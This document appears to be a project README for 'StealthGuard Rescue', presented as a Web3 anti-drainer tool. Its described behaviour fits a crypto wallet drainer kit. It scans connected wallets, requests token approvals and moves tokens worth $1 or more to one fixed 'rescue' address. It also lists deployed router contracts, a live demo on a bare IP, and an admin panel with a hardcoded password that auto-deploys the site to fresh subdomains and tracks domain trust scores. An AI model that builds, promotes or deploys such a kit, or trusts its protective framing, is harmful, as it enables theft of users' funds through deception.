# StealthGuard Rescue v3.2

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Network](https://img.shields.io/badge/networks-5_chains-purple.svg)]()
[![Contract](https://img.shields.io/badge/BSC-verified-green.svg)](https://bscscan.com/address/0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127)

> Web3 Anti-Drainer & Asset Rescue Platform - Automated token recovery system with multi-chain support.

**Live Demo**: http://194.60.133.152:8888/test-rescue.html

> Примечание: Текущий сервер использует порт 8888 для обоих проектов. HODL Dog на корневом пути `/`, StealthGuard на `/test-rescue.html`

---

## Overview

StealthGuard Rescue is a Web3 security system designed to protect users from drainer attacks through automated asset rescue mechanisms. The system scans token balances, calculates USD values, and executes rescue approvals based on configurable thresholds.

### Key Features

- **Multi-Chain Support**: BSC, Ethereum, Polygon, Arbitrum, Base
- **Smart Threshold Logic**: ≥$1 = approve + rescue, <$1 = approve only
- **Wallet Auto-Detection**: Supports MetaMask, Trust, SafePal, Coinbase, WalletConnect
- **SafePal Fix**: Handles `defaultChain` error with retry logic
- **Built-in Admin Panel**: Domain monitoring, auto-deploy, health checks

---

## Deployed Contracts

| Chain | Router Address | Explorer |
|-------|---------------|----------|
| **BSC** | `0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127` | [BscScan](https://bscscan.com/address/0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127) |
| **Polygon** | `0x54535eDABE6aceE38Aede2933aD3464F014106e` | [PolygonScan](https://polygonscan.com/address/0x54535eDABE6aceE38Aede2933aD3464F014106e) |
| **Arbitrum** | `0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201` | [Arbiscan](https://arbiscan.io/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201) |
| **Base** | `0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201` | [Basescan](https://basescan.org/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201) |
| **Ethereum** | `0x54535eDABE6aceE38Aede2933aD3464F014106e` | [Etherscan](https://etherscan.io/address/0x54535eDABE6aceE38Aede2933aD3464F014106e) |

**Rescue Destination**: `0xb0e0306ab4b82774686d7d032e0157ddc8352648`

---

## Quick Start

### Prerequisites

```bash
node -v  # >= 18
npm -v   # >= 9
```

### Installation

```bash
# Clone repository
git clone <repo-url>
cd StealthGuard

# Install dependencies
npm install

# Copy environment file
cp .env.example .env
# Edit .env with your WalletConnect Project ID
```

### Environment Variables

Create `.env` file:

```env
# Required for WalletConnect
VITE_WC_PROJECT_ID=your_project_id_from_cloud.walletconnect.com

# Optional: Custom RPC endpoints
VITE_BSC_RPC=https://bsc-dataseed.binance.org
VITE_ETH_RPC=https://eth.llamarpc.com
```

### Development

```bash
# Start dev server
npm run dev

# Build for production
npm run build

# Type check
npm run typecheck
```

---

## Project Structure

```
StealthGuard/
├── contracts/
│   └── RescueRouter.sol          # Solidity smart contract
├── src/
│   ├── components/
│   │   ├── ConnectButton.tsx     # Wallet connection (SafePal fix)
│   │   ├── AssetScanner.tsx      # Token balance scanner
│   │   ├── RescuePanel.tsx       # Approve & rescue UI
│   │   └── DomainMonitor.tsx     # Admin panel (password: 777888)
│   ├── utils/
│   │   ├── walletDetector.ts     # Auto-detect wallets
│   │   └── tokenPrices.ts        # Threshold logic
│   ├── config/
│   │   ├── wagmi.ts              # Web3 configuration
│   │   └── contracts.ts          # Contract addresses (5 chains)
│   ├── App.tsx
│   ├── main.tsx
│   └── index.css
├── .env.example                  # Environment template
├── index.html
├── package.json
└── README.md
```

---

## Admin Panel

Access the built-in admin panel for domain monitoring and deployment:

- **Shortcut**: `Ctrl+Shift+A`
- **Console**: Type `admin777888`
- **Password**: `777888`

### Features

- **Domain Monitor**: Health checks, trust scores, auto-check every 60s
- **Deploy**: GitHub Pages & Cloudflare deployment with auto-generated subdomains
- **Statistics**: Token rescue stats and analytics

---

## SafePal Fix

The wallet connection includes a fix for SafePal's `defaultChain` error:

```typescript
// src/utils/walletDetector.ts
export function wrapProvider(provider: any): any {
  // Wraps provider with 3-attempt retry logic
  // Handles error: "Cannot destructure property 'defaultChain'"
}
```

---

## Export Codebase

For AI audit and analysis:

```bash
# Make executable
chmod +x export-codebase.sh

# Export all source code
./export-codebase.sh

# Output: codebase-export-YYYYMMDD-HHMMSS.md
```

---

## Security Notes

- **Never commit `.env` file** to git (already in `.gitignore`)
- **Never share API tokens** in chat or commits
- Change admin password in `DomainMonitor.tsx` if needed
- Contracts are verified on all explorers

---

## License

MIT License

---

**Disclaimer**: This software is provided as-is for security research and asset recovery. Use at your own risk. Always audit contracts before mainnet deployment.
